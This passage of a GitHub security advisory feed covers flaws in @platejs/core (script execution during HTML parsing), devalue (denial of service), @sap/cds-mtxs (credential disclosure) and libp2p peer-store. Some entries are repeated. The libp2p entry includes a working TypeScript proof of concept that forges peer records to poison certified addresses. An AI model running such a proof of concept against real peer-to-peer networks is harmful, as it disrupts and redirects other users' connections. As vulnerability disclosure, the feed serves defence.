<p>An attacker who can control HTML later deserialized in another user's browser may be able to execute script in that application's origin.</p>
<h3 id="remediation">Remediation</h3>
<p>Upgrade to <code>@platejs/core</code> 53.3.11 or later. Users of the discontinued 54.0.0 beta builds should install the fixed stable line. Applications should also sanitize untrusted HTML before rendering it; inert parsing is not a substitute for sanitization.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/udecode/plate/security/advisories/GHSA-qrfj-mgw8-j9c6">https://github.com/udecode/plate/security/advisories/GHSA-qrfj-mgw8-j9c6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-88976">https://nvd.nist.gov/vuln/detail/CVE-2026-88976</a></li>
<li><a href="https://github.com/udecode/plate/pull/5117">https://github.com/udecode/plate/pull/5117</a></li>
<li><a href="https://github.com/udecode/plate/commit/d02afe45d5ec3a9fb95e0745bc5820ff18a3c12b">https://github.com/udecode/plate/commit/d02afe45d5ec3a9fb95e0745bc5820ff18a3c12b</a></li>
<li><a href="https://github.com/udecode/plate/releases/tag/v53.3.11">https://github.com/udecode/plate/releases/tag/v53.3.11</a></li>
<li><a href="https://github.com/advisories/GHSA-qrfj-mgw8-j9c6">https://github.com/advisories/GHSA-qrfj-mgw8-j9c6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qrfj-mgw8-j9c6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-17T20:32:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@platejs/core] @platejs/core HTML deserialization can trigger browser behavior during parsing]]></title>
        <id>https://github.com/advisories/GHSA-qrfj-mgw8-j9c6</id>
        <link href="https://github.com/advisories/GHSA-qrfj-mgw8-j9c6"/>
        <updated>2026-09-17T20:32:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>HTML strings passed to Plate's core deserialization APIs were parsed in the active document. Certain HTML attributes could therefore trigger browser behavior during parsing, before the content was converted into editor nodes.</p>
<p>Applications that deserialize HTML from untrusted or cross-user sources may be affected.</p>
<h3 id="impact">Impact</h3>
<p>An attacker who can control HTML later deserialized in another user's browser may be able to execute script in that application's origin.</p>
<h3 id="remediation">Remediation</h3>
<p>Upgrade to <code>@platejs/core</code> 53.3.11 or later. Users of the discontinued 54.0.0 beta builds should install the fixed stable line. Applications should also sanitize untrusted HTML before rendering it; inert parsing is not a substitute for sanitization.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/udecode/plate/security/advisories/GHSA-qrfj-mgw8-j9c6">https://github.com/udecode/plate/security/advisories/GHSA-qrfj-mgw8-j9c6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-88976">https://nvd.nist.gov/vuln/detail/CVE-2026-88976</a></li>
<li><a href="https://github.com/udecode/plate/pull/5117">https://github.com/udecode/plate/pull/5117</a></li>
<li><a href="https://github.com/udecode/plate/commit/d02afe45d5ec3a9fb95e0745bc5820ff18a3c12b">https://github.com/udecode/plate/commit/d02afe45d5ec3a9fb95e0745bc5820ff18a3c12b</a></li>
<li><a href="https://github.com/udecode/plate/releases/tag/v53.3.11">https://github.com/udecode/plate/releases/tag/v53.3.11</a></li>
<li><a href="https://github.com/advisories/GHSA-qrfj-mgw8-j9c6">https://github.com/advisories/GHSA-qrfj-mgw8-j9c6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qrfj-mgw8-j9c6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-17T20:32:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[devalue] Svelte devalue: DoS via malformed input]]></title>
        <id>https://github.com/advisories/GHSA-9rgm-9g3h-6x36</id>
        <link href="https://github.com/advisories/GHSA-9rgm-9g3h-6x36"/>
        <updated>2026-09-17T20:28:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><code>devalue.parse</code> prior to version 5.9.2 fails to reject out-of-bounds indices. Specially-crafted payloads can exploit this to cause devalue to alternate between different array representations, resulting in work that is quadratic with payload size.</p>
<p>Applications are potentially affected if they call <code>devalue.parse</code> with untrusted data.</p>
<h3 id="patches">Patches</h3>
<p>The bug is fixed in <code>devalue@5.9.2</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sveltejs/devalue/security/advisories/GHSA-9rgm-9g3h-6x36">https://github.com/sveltejs/devalue/security/advisories/GHSA-9rgm-9g3h-6x36</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-81176">https://nvd.nist.gov/vuln/detail/CVE-2026-81176</a></li>
<li><a href="https://github.com/sveltejs/devalue/commit/8b2a4562c446d7c36d9d629778079a5fae4243e1">https://github.com/sveltejs/devalue/commit/8b2a4562c446d7c36d9d629778079a5fae4243e1</a></li>
<li><a href="https://github.com/sveltejs/devalue/releases/tag/v5.9.2">https://github.com/sveltejs/devalue/releases/tag/v5.9.2</a></li>
<li><a href="https://github.com/advisories/GHSA-9rgm-9g3h-6x36">https://github.com/advisories/GHSA-9rgm-9g3h-6x36</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9rgm-9g3h-6x36</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-17T20:28:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@sap/cds-mtxs] @sap/cds-mtx: Credential disclosure in multitenant applications using SAP Cloud Application Programming Model (CAP)]]></title>
        <id>https://github.com/advisories/GHSA-955m-rr6m-2f9v</id>
        <link href="https://github.com/advisories/GHSA-955m-rr6m-2f9v"/>
        <updated>2026-09-17T19:05:40.000Z</updated>
        <content type="html"><![CDATA[<p>@sap/cds-mtxs NPM library does not perform sufficient checks on certain functionality used in multitenant CAP applications with extensibility enabled. An unauthenticated attacker could send specially crafted requests to obtain sensitive credentials and abuse them to replace or delete tenant data. Successful exploitation can result in a high impact on availability and integrity of the application. There may also be partial impact to the confidentiality of business data.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-76969">https://nvd.nist.gov/vuln/detail/CVE-2026-76969</a></li>
<li><a href="https://me.sap.com/notes/3798315">https://me.sap.com/notes/3798315</a></li>
<li><a href="https://url.sap/sapsecuritypatchday">https://url.sap/sapsecuritypatchday</a></li>
<li><a href="https://github.com/advisories/GHSA-955m-rr6m-2f9v">https://github.com/advisories/GHSA-955m-rr6m-2f9v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-955m-rr6m-2f9v</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-09-08T03:31:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@sap/cds-mtxs] @sap/cds-mtx: Credential disclosure in multitenant applications using SAP Cloud Application Programming Model (CAP)]]></title>
        <id>https://github.com/advisories/GHSA-955m-rr6m-2f9v</id>
        <link href="https://github.com/advisories/GHSA-955m-rr6m-2f9v"/>
        <updated>2026-09-17T19:05:40.000Z</updated>
        <content type="html"><![CDATA[<p>@sap/cds-mtxs NPM library does not perform sufficient checks on certain functionality used in multitenant CAP applications with extensibility enabled. An unauthenticated attacker could send specially crafted requests to obtain sensitive credentials and abuse them to replace or delete tenant data. Successful exploitation can result in a high impact on availability and integrity of the application. There may also be partial impact to the confidentiality of business data.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-76969">https://nvd.nist.gov/vuln/detail/CVE-2026-76969</a></li>
<li><a href="https://me.sap.com/notes/3798315">https://me.sap.com/notes/3798315</a></li>
<li><a href="https://url.sap/sapsecuritypatchday">https://url.sap/sapsecuritypatchday</a></li>
<li><a href="https://github.com/advisories/GHSA-955m-rr6m-2f9v">https://github.com/advisories/GHSA-955m-rr6m-2f9v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-955m-rr6m-2f9v</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-09-08T03:31:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@sap/cds-mtxs] @sap/cds-mtx: Credential disclosure in multitenant applications using SAP Cloud Application Programming Model (CAP)]]></title>
        <id>https://github.com/advisories/GHSA-955m-rr6m-2f9v</id>
        <link href="https://github.com/advisories/GHSA-955m-rr6m-2f9v"/>
        <updated>2026-09-17T19:05:40.000Z</updated>
        <content type="html"><![CDATA[<p>@sap/cds-mtxs NPM library does not perform sufficient checks on certain functionality used in multitenant CAP applications with extensibility enabled. An unauthenticated attacker could send specially crafted requests to obtain sensitive credentials and abuse them to replace or delete tenant data. Successful exploitation can result in a high impact on availability and integrity of the application. There may also be partial impact to the confidentiality of business data.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-76969">https://nvd.nist.gov/vuln/detail/CVE-2026-76969</a></li>
<li><a href="https://me.sap.com/notes/3798315">https://me.sap.com/notes/3798315</a></li>
<li><a href="https://url.sap/sapsecuritypatchday">https://url.sap/sapsecuritypatchday</a></li>
<li><a href="https://github.com/advisories/GHSA-955m-rr6m-2f9v">https://github.com/advisories/GHSA-955m-rr6m-2f9v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-955m-rr6m-2f9v</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-09-08T03:31:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@sap/cds-mtxs] @sap/cds-mtx: Credential disclosure in multitenant applications using SAP Cloud Application Programming Model (CAP)]]></title>
        <id>https://github.com/advisories/GHSA-955m-rr6m-2f9v</id>
        <link href="https://github.com/advisories/GHSA-955m-rr6m-2f9v"/>
        <updated>2026-09-17T19:05:40.000Z</updated>
        <content type="html"><![CDATA[<p>@sap/cds-mtxs NPM library does not perform sufficient checks on certain functionality used in multitenant CAP applications with extensibility enabled. An unauthenticated attacker could send specially crafted requests to obtain sensitive credentials and abuse them to replace or delete tenant data. Successful exploitation can result in a high impact on availability and integrity of the application. There may also be partial impact to the confidentiality of business data.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-76969">https://nvd.nist.gov/vuln/detail/CVE-2026-76969</a></li>
<li><a href="https://me.sap.com/notes/3798315">https://me.sap.com/notes/3798315</a></li>
<li><a href="https://url.sap/sapsecuritypatchday">https://url.sap/sapsecuritypatchday</a></li>
<li><a href="https://github.com/advisories/GHSA-955m-rr6m-2f9v">https://github.com/advisories/GHSA-955m-rr6m-2f9v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-955m-rr6m-2f9v</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-09-08T03:31:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@libp2p/peer-store] libp2p: PeerStore accepts attacker-signed PeerRecords for a victim peer ID and stores certified attacker addresses]]></title>
        <id>https://github.com/advisories/GHSA-vrf4-mx87-p53w</id>
        <link href="https://github.com/advisories/GHSA-vrf4-mx87-p53w"/>
        <updated>2026-09-17T18:01:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>@libp2p/peer-store</code> accepts a signed <code>PeerRecord</code> whose envelope is signed by one peer but whose payload claims a different peer ID. The vulnerable <code>consumePeerRecord</code> path verifies the envelope signature, but does not verify that the envelope signer is the same peer as the wrapped <code>PeerRecord.peerId</code>. As a result, an attacker can sign a record with their own key while placing a victim peer ID in the payload, causing attacker-controlled multiaddrs to be stored as certified addresses for the victim.</p>
<h3 id="details">Details</h3>
<p>The vulnerable code is in <code>packages/peer-store/src/index.ts</code>:</p>
<ul>
<li><code>RecordEnvelope.openAndCertify(buf, PeerRecord.DOMAIN, options)</code> verifies the envelope signature.</li>
<li><code>const peerId = peerIdFromCID(envelope.publicKey.toCID())</code> derives the envelope signer peer ID.</li>
<li>The optional <code>expectedPeer</code> check only compares <code>expectedPeer</code> to the envelope signer.</li>
<li><code>const peerRecord = PeerRecord.createFromProtobuf(envelope.payload)</code> decodes <code>peerRecord.peerId</code> from attacker-controlled signed payload bytes.</li>
<li><code>this.patch(peerRecord.peerId, { peerRecordEnvelope: buf, addresses: ... isCertified: true })</code> stores the addresses under the payload peer ID, not the verified signer peer ID.</li>
</ul>
<p>The missing invariant is:</p>
<pre><code class="language-ts">peerRecord.peerId.equals(peerIdFromCID(envelope.publicKey.toCID()))
</code></pre>
<p><code>packages/protocol-identify/src/utils.ts</code> already performs this check and can be used as the reference behavior:</p>
<pre><code class="language-ts">if (!peerRecord.peerId.equals(envelopePeer)) {
  throw new InvalidMessageError('signing key does not match PeerId in the PeerRecord')
}
</code></pre>
<p>The gossipsub Peer Exchange path reaches this code via <code>packages/gossipsub/src/gossipsub.ts</code> by calling:</p>
<pre><code class="language-ts">peerStore.consumePeerRecord(pi.signedPeerRecord, { expectedPeer: peer })
</code></pre>
<p>This does not prevent the bug because <code>peer</code> is derived from the wire <code>pi.peerID</code>. An attacker can set <code>pi.peerID</code> to their own peer ID, sign the envelope with their own key, and put the victim peer ID inside the wrapped <code>PeerRecord</code>.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-ts">// TypeScript ESM PoC.
import { strict as assert } from 'node:assert'
import { generateKeyPair } from '@libp2p/crypto/keys'
import { defaultLogger } from '@libp2p/logger'
import { peerIdFromPrivateKey } from '@libp2p/peer-id'
import { PeerRecord, RecordEnvelope } from '@libp2p/peer-record'
import { persistentPeerStore } from '@libp2p/peer-store'
import { multiaddr } from '@multiformats/multiaddr'
import { MemoryDatastore } from 'datastore-core/memory'
import { TypedEventEmitter } from 'main-event'

const label = 'Certified peer-record address hijack'

async function main (): Promise&lt;void&gt; {
  const localKey = await generateKeyPair('Ed25519')
  const attackerKey = await generateKeyPair('Ed25519')
  const victimKey = await generateKeyPair('Ed25519')

  const attacker = peerIdFromPrivateKey(attackerKey)
  const victim = peerIdFromPrivateKey(victimKey)
  const attackerAddr = multiaddr('/ip4/203.0.113.66/tcp/4001')

  const peerStore = persistentPeerStore({
    peerId: peerIdFromPrivateKey(localKey),
    datastore: new MemoryDatastore(),
    events: new TypedEventEmitter(),
    logger: defaultLogger()
  })

  // Payload claims victim, but the envelope is signed by attacker.
  const forgedRecord = new PeerRecord({
    peerId: victim,
    multiaddrs: [attackerAddr],
    seqNumber: 999999n
  })
  const forgedEnvelope = await RecordEnvelope.seal(forgedRecord, attackerKey)

  // Emulates gossipsub PX: pi.peerID == attacker, expectedPeer == attacker.
  const accepted = await peerStore.consumePeerRecord(forgedEnvelope.marshal(), {
    expectedPeer: attacker
  })

  assert.equal(accepted, true)

  const poisonedVictim = await peerStore.get(victim)
  assert.deepEqual(poisonedVictim.addresses.map(({ multiaddr, isCertified }) =&gt; ({
    multiaddr: multiaddr.toString(),
    isCertified
  })), [{
    multiaddr: attackerAddr.toString(),
    isCertified: true
  }])

  console.log(`${label} reproduced`)
  console.log(`attacker signer: ${attacker}`)
  console.log(`victim storage key: ${victim}`)
  console.log(`stored certified address: ${attackerAddr}`)
}

main().catch(err =&gt; {
  console.error(err)
  process.exitCode = 1
})
</code></pre>
<p>Expected output:</p>
<pre><code class="language-text">Certified peer-record address hijack reproduced
attacker signer: 12D3KooWEdL1GaEhVGrhsKhubbiNQxWYTbX27ywm5JJ6W5Zh81gj
victim storage key: 12D3KooWCZBY7mRMDfuWSR9p4X6qJQgNyYXrrnzozW4zSUPSJUFn
stored certified address: /ip4/203.0.113.66/tcp/4001
</code></pre>
<h3 id="impact">Impact</h3>
<p>Attackers can poison peer-store certified address records for third-party peers. Certified addresses are preferred by dial address sorting, so future dials to the victim may attempt attacker-controlled or invalid endpoints. This can cause reachability disruption, address-book poisoning, and routing manipulation for applications that consume untrusted signed peer records.</p>
<p>This does not by itself let the attacker complete an encrypted libp2p connection as the victim, because the connection upgrade path still verifies the remote peer identity. The demonstrated impact is certified address poisoning and dial redirection/failure, not a full peer identity takeover.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/libp2p/js-libp2p/security/advisories/GHSA-vrf4-mx87-p53w">https://github.com/libp2p/js-libp2p/security/advisories/GHSA-vrf4-mx87-p53w</a></li>
<li><a href="https://github.com/libp2p/js-libp2p/pull/3570">https://github.com/libp2p/js-libp2p/pull/3570</a></li>
<li><a href="https://github.com/libp2p/js-libp2p/commit/3bf5d395cbca1488eea6e87cd771e4613b661c30">https://github.com/libp2p/js-libp2p/commit/3bf5d395cbca1488eea6e87cd771e4613b661c30</a></li>
<li><a href="https://github.com/libp2p/js-libp2p/releases/tag/peer-store-v12.0.24">https://github.com/libp2p/js-libp2p/releases/tag/peer-store-v12.0.24</a></li>
<li><a href="https://github.com/advisories/GHSA-vrf4-mx87-p53w">https://github.com/advisories/GHSA-vrf4-mx87-p53w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vrf4-mx87-p53w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-17T18:01:38.000Z</published>
    </entry>
</feed>